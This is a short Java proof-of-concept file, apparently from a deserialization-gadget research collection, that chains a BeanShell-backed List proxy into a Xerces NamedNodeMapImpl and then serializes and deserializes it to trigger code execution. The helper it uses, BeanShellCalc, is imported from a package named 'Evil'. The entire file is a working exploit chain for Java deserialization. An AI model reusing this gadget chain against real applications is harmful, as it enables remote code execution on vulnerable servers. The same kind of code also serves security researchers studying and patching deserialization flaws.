package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.List;

public class POC_9 {

    /***
     * run with namedNode.jar
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("toArray");
        List l = (List) Proxy.newProxyInstance(List.class.getClassLoader(), new Class<?>[]{List.class}, handler);

        Object node = ReflectionUtil.createWithoutConstructor(Class.forName("com.sun.org.apache.xerces.internal.dom.NamedNodeMapImpl"));
        ReflectionUtil.setField(node, "nodes", l);

        SerializeUtil.deserialize(SerializeUtil.serialize(node));
    }

}
